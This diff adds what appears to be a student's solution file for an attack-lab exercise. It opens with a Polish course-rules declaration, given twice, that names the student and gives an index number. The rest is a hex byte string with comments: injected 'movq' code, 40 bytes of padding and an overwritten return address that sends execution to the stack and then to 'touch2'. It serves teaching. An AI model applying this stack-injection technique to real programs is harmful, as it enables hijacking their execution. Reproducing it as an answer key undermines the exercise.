@@ -1,0 +1,25 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Artur Bieniek, 347165
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Artur Bieniek, 347165
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+
+48 c7 c7 cd c3 ae 54 c3 /* movq $0x54aec3cd, %rdi; ret */
+de ad c0 de de ad c0 de /* dopełnienie do 40 bajtów bufora */
+de ad c0 de de ad c0 de
+de ad c0 de de ad c0 de
+de ad c0 de de ad c0 de
+18 b6 64 55 00 00 00 00 /* skaczemy tu na adres na stosie, pod którym jest instrukcja na górze */
+5b 1b 40 00 00 00 00 00 /* skaczemy do touch2, to się wykona na końcu, po returnie od instrukcji na górze */
